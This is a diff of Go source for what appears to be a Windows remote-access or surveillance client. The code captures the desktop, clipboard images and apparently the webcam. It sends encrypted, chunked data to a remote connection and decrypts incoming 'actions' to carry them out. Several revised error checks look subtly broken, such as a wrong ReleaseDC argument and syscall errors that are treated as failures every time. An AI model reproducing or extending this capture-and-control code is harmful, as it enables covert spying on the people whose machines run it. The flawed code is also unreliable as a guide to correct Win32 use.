@@ -68,28 +68,26 @@ var (
 	capCreateCaptureWindowA = avicap32.NewProc("capCreateCaptureWindowA")
 
 	user32           = windows.NewLazySystemDLL("user32.dll")
+	getDC            = user32.NewProc("GetDC")
+	releaseDC        = user32.NewProc("ReleaseDC")
 	closeClipboard   = user32.NewProc("CloseClipboard")
 	getClipboardData = user32.NewProc("GetClipboardData")
 	openClipboard    = user32.NewProc("OpenClipboard")
+	getSystemMetrics = user32.NewProc("GetSystemMetrics")
 	sendMessageA     = user32.NewProc("SendMessageA")
 
 	kernel32     = windows.NewLazySystemDLL("kernel32.dll")
 	globalLock   = kernel32.NewProc("GlobalLock")
-	globalSize   = kernel32.NewProc("GlobalSize")
 	globalUnlock = kernel32.NewProc("GlobalUnlock")
 
 	gdi32                  = windows.NewLazySystemDLL("gdi32.dll")
-	bitBlt                 = gdi32.NewProc("BitBlt")
-	createDIBSection       = gdi32.NewProc("CreateDIBSection")
-	deleteDC               = gdi32.NewProc("DeleteDC")
-	deleteObject           = gdi32.NewProc("DeleteObject")
-	getSystemMetrics       = gdi32.NewProc("GetSystemMetrics")
-	getDC                  = gdi32.NewProc("GetDC")
-	getDIBits              = gdi32.NewProc("GetDIBits")
 	createCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
+	deleteDC               = gdi32.NewProc("DeleteDC")
 	createCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
-	releaseDC              = gdi32.NewProc("ReleaseDC")
 	selectObject           = gdi32.NewProc("SelectObject")
+	bitBlt                 = gdi32.NewProc("BitBlt")
+	deleteObject           = gdi32.NewProc("DeleteObject")
+	getDIBits              = gdi32.NewProc("GetDIBits")
 )
 
 const (
@@ -317,35 +315,47 @@ func SendCommand(response interface{}) {
 		WriteLog("Failed to marshal response: %v", err)
 		return
 	}
+
 	encrypted, err := EncryptData(jsonData, sessionId)
 	if err != nil {
 		WriteLog("Failed to encrypt data: %v", err)
 		return
 	}
+
 	encryptedBytes := []byte(encrypted)
 	totalLength := len(encryptedBytes)
-	chunk := make([]byte, chunkSize+len("--FIN--"))
+	chunk := make([]byte, chunkSize+7) // Account for --FIN-- at the end
 
-	if totalLength >= chunkSize {
+	if totalLength > chunkSize {
 		for i := 0; i < totalLength; i += chunkSize {
 			end := i + chunkSize
 			if end > totalLength {
 				end = totalLength
 			}
-			copy(chunk, encryptedBytes[i:end])
+
+			// Copy the chunk of data
+			copy(chunk[:end-i], encryptedBytes[i:end])
+
+			// Append --FIN-- if this is the last chunk
 			if end == totalLength {
-				copy(chunk[len(encryptedBytes[i:end]):], "--FIN--")
-			}
-			WriteLog("Sent Chunk: %s", string(chunk[:end]))
-			if _, err := client.Write(chunk[:end]); err != nil {
-				WriteLog("failed to write chunk to client: %w", err)
-				return
+				copy(chunk[end-i:], []byte("--FIN--"))
+				WriteLog("Sent Chunk: %s", string(chunk[:end-i+len("--FIN--")]))
+				if _, err := client.Write(chunk[:end-i+len("--FIN--")]); err != nil {
+					WriteLog("Failed to write chunk with FIN to client: %w", err)
+					return
+				}
+			} else {
+				WriteLog("Sent Chunk: %s", string(chunk[:end-i]))
+				if _, err := client.Write(chunk[:end-i]); err != nil {
+					WriteLog("Failed to write chunk to client: %w", err)
+					return
+				}
 			}
 		}
 	} else {
 		WriteLog("Sent Data: %s", encrypted)
 		if _, err := client.Write(encryptedBytes); err != nil {
-			WriteLog("failed to write data to client: %w", err)
+			WriteLog("Failed to write data to client: %w", err)
 			return
 		}
 	}
@@ -430,51 +440,101 @@ func CaptureWebcam() ([]byte, error) {
 }
 
 func CaptureDesktop() ([]byte, error) {
-	screenDC, _, _ := getDC.Call(0)
-	defer releaseDC.Call(0, screenDC)
-	hdcMem, _, _ := createCompatibleDC.Call(screenDC)
-	defer deleteDC.Call(hdcMem)
-	screenWidth, _, _ := getSystemMetrics.Call(SM_CXSCREEN)
-	screenHeight, _, _ := getSystemMetrics.Call(SM_CYSCREEN)
-	bitmap, _, _ := createCompatibleBitmap.Call(screenDC, screenWidth, screenHeight)
-	defer deleteObject.Call(bitmap)
-	oldBitmap, _, _ := selectObject.Call(hdcMem, bitmap)
-	defer selectObject.Call(hdcMem, oldBitmap)
-	ret, _, _ := bitBlt.Call(hdcMem, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY)
-	if ret == 0 {
-		return nil, fmt.Errorf("BitBlt failed")
+	// Check if procedures are properly loaded
+	if getDC == nil || releaseDC == nil || createCompatibleDC == nil || deleteDC == nil ||
+		createCompatibleBitmap == nil || selectObject == nil || bitBlt == nil || getSystemMetrics == nil ||
+		deleteObject == nil || getDIBits == nil {
+		return nil, fmt.Errorf("one or more GDI32 procedures are not found")
 	}
+
+	screenDC, _, err := getDC.Call(0)
+	if screenDC == 0 {
+		return nil, fmt.Errorf("GetDC failed: %v", err)
+	}
+	defer releaseDC.Call(screenDC, screenDC)
+
+	hdcMem, _, err := createCompatibleDC.Call(screenDC)
+	if hdcMem == 0 {
+		return nil, fmt.Errorf("CreateCompatibleDC failed: %v", err)
+	}
+	defer deleteDC.Call(hdcMem)
+
+	screenWidth, _, err := getSystemMetrics.Call(SM_CXSCREEN)
+	if screenWidth == 0 {
+		return nil, fmt.Errorf("GetSystemMetrics for width failed: %v", err)
+	}
+
+	screenHeight, _, err := getSystemMetrics.Call(SM_CYSCREEN)
+	if screenHeight == 0 {
+		return nil, fmt.Errorf("GetSystemMetrics for height failed: %v", err)
+	}
+
+	bitmap, _, err := createCompatibleBitmap.Call(screenDC, screenWidth, screenHeight)
+	if bitmap == 0 {
+		return nil, fmt.Errorf("CreateCompatibleBitmap failed: %v", err)
+	}
+	defer deleteObject.Call(bitmap)
+
+	oldBitmap, _, err := selectObject.Call(hdcMem, bitmap)
+	if oldBitmap == 0 {
+		return nil, fmt.Errorf("SelectObject failed: %v", err)
+	}
+	defer selectObject.Call(hdcMem, oldBitmap)
+
+	ret, _, err := bitBlt.Call(hdcMem, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY)
+	if ret == 0 {
+		return nil, fmt.Errorf("BitBlt failed: %v", err)
+	}
+
 	img, err := bitmapToImage(hdcMem, screenWidth, screenHeight)
 	if err != nil {
 		return nil, fmt.Errorf("failed to convert bitmap to image: %v", err)
 	}
+
 	var buf bytes.Buffer
 	if err := png.Encode(&buf, img); err != nil {
 		return nil, fmt.Errorf("failed to encode image as PNG: %v", err)
 	}
+
 	return buf.Bytes(), nil
 }
 
 func bitmapToImage(hdcMem, width, height uintptr) (image.Image, error) {
+	// Define BITMAPINFO structure
 	bmi := BITMAPINFO{
 		BmiHeader: BITMAPINFOHEADER{
 			BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
 			BiWidth:       int32(width),
-			BiHeight:      int32(-height),
+			BiHeight:      int32(-height), // Negative height for top-down DIB
 			BiPlanes:      1,
 			BiBitCount:    24,
 			BiCompression: 0,
 		},
 	}
+
+	// Determine the size of the bitmap data
 	var bmpSize uint32
-	_, _, _ = getDIBits.Call(hdcMem, 0, 0, 0, uintptr(unsafe.Pointer(&bmi)), 0, uintptr(unsafe.Pointer(&bmpSize)))
-	if bmpSize == 0 {
-		return nil, fmt.Errorf("failed to get bitmap data size")
+	_, _, err := getDIBits.Call(hdcMem, 0, 0, 0, uintptr(unsafe.Pointer(&bmi)), 0, uintptr(unsafe.Pointer(&bmpSize)))
+	if err != nil || bmpSize == 0 {
+		return nil, fmt.Errorf("failed to get bitmap data size: %v", err)
 	}
+
+	// Allocate buffer for bitmap data
 	data := make([]byte, bmpSize)
-	_, _, _ = getDIBits.Call(hdcMem, 0, 0, uintptr(height), uintptr(unsafe.Pointer(&bmi)), uintptr(unsafe.Pointer(&data[0])), 0)
+
+	// Get bitmap data
+	_, _, err = getDIBits.Call(hdcMem, 0, 0, uintptr(height), uintptr(unsafe.Pointer(&bmi)), uintptr(unsafe.Pointer(&data[0])), 0)
+	if err != nil {
+		return nil, fmt.Errorf("failed to get bitmap data: %v", err)
+	}
+
+	// Create a new RGBA image
 	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
+
+	// Calculate row size in bytes, padded to a multiple of 4 bytes
 	rowSize := (width*3 + 3) &^ 3
+
+	// Copy data into image
 	for y := 0; y < int(height); y++ {
 		for x := 0; x < int(width); x++ {
 			offset := (y*int(rowSize) + x*3)
@@ -484,6 +544,7 @@ func bitmapToImage(hdcMem, width, height uintptr) (image.Image, error) {
 			img.Set(x, int(height)-y-1, color.RGBA{R: r, G: g, B: b, A: 255})
 		}
 	}
+
 	return img, nil
 }
 
@@ -494,36 +555,43 @@ func GetImageFromClipboard() (image.Image, error) {
 		return nil, fmt.Errorf("failed to open clipboard")
 	}
 	defer closeClipboard.Call()
+
 	handle, _, _ := getClipboardData.Call(CF_DIB)
 	if handle == 0 {
 		return nil, fmt.Errorf("failed to get clipboard data")
 	}
-	size, _, _ := globalSize.Call(handle)
+
 	ptr, _, _ := globalLock.Call(handle)
 	if ptr == 0 {
 		return nil, fmt.Errorf("failed to lock global memory")
 	}
 	defer globalUnlock.Call(handle)
+
 	bitmapInfo := (*BITMAPINFO)(unsafe.Pointer(ptr))
 	width := int(bitmapInfo.BmiHeader.BiWidth)
 	height := int(bitmapInfo.BmiHeader.BiHeight)
-	biSize := uintptr(bitmapInfo.BmiHeader.BiSize)
-	colorTableSize := uintptr(bitmapInfo.BmiHeader.BiClrUsed) * unsafe.Sizeof(RGBQUAD{})
-	dataOffset := biSize + colorTableSize
-	dataSize := uintptr(size) - dataOffset
-	var bits unsafe.Pointer
-	hdc, _, _ := createDIBSection.Call(0, uintptr(unsafe.Pointer(bitmapInfo)), 0, uintptr(unsafe.Pointer(&bits)), 0, 0)
-	if hdc == 0 {
-		return nil, fmt.Errorf("failed to create DIB section")
+
+	// Ensure the height is positive and compute row padding
+	if height < 0 {
+		height = -height
 	}
-	defer deleteObject.Call(hdc)
+	rowSize := (width*3 + 3) &^ 3
+
+	// Calculate the offset of bitmap data
+	dataOffset := uintptr(bitmapInfo.BmiHeader.BiSize) + uintptr(bitmapInfo.BmiHeader.BiClrUsed)*unsafe.Sizeof(RGBQUAD{})
 	dataPtr := uintptr(ptr) + dataOffset
-	copy((*[1 << 30]byte)(bits)[:dataSize:dataSize], (*[1 << 30]byte)(unsafe.Pointer(dataPtr))[:dataSize:dataSize])
-	img := &image.RGBA{
-		Pix:    (*[1 << 30]uint8)(bits)[:width*height*4],
-		Stride: width * 4,
-		Rect:   image.Rect(0, 0, width, height),
+
+	// Create a new image
+	img := image.NewRGBA(image.Rect(0, 0, width, height))
+
+	// Copy the data into the image
+	for y := 0; y < height; y++ {
+		srcOffset := dataPtr + uintptr(y)*uintptr(rowSize)
+		dstOffset := y * img.Stride
+		// Ensure to copy only the size of one row
+		copy(img.Pix[dstOffset:dstOffset+rowSize], (*[1 << 30]byte)(unsafe.Pointer(srcOffset))[:rowSize])
 	}
+
 	return img, nil
 }
 
@@ -682,6 +750,8 @@ func HandleConnection(conn net.Conn) {
 	defer conn.Close() // Ensure the connection is closed when done
 
 	reader := bufio.NewReader(conn)
+	var buffer bytes.Buffer
+	var data []byte
 
 	for {
 		if exitProcess {
@@ -692,7 +762,7 @@ func HandleConnection(conn net.Conn) {
 		// Set a read deadline to prevent blocking indefinitely
 		conn.SetReadDeadline(time.Now().Add(10 * time.Second)) // Increased deadline for stability
 
-		chunk := make([]byte, 1024)
+		chunk := make([]byte, chunkSize+7) // account for --FIN-- on ending chunks
 		n, err := reader.Read(chunk)
 		if err != nil {
 			if err == io.EOF {
@@ -708,9 +778,31 @@ func HandleConnection(conn net.Conn) {
 		}
 
 		if n > 0 {
-			WriteLog("Received data: %s", string(chunk[:n])) // Log received chunk for debugging
-			if len(chunk[:n]) > 0 {
-				action, err := DecryptData(string(chunk[:n]), sessionId)
+			index := bytes.Index(buffer.Bytes(), []byte("--FIN--"))
+
+			if n >= chunkSize || index != -1 {
+				// chunk mode
+				buffer.Write(chunk[:n])
+				if index != -1 {
+					buffer.Next(index + len([]byte("--FIN--"))) // --FIN-- length
+					data = buffer.Bytes()
+				}
+			} else {
+				// non chunk mode
+				data = make([]byte, n)
+				copy(data, chunk[:n])
+			}
+
+			if len(data) > 0 {
+				// Ensure we do not panic when slicing data
+				dataStr := string(data)
+				if len(dataStr) > 100 {
+					WriteLog("Received data: %s", dataStr[:100])
+				} else {
+					WriteLog("Received data: %s", dataStr)
+				}
+
+				action, err := DecryptData(dataStr, sessionId)
 				if err != nil {
 					WriteLog("DecryptData error: %v", err)
 				} else if action != "" {
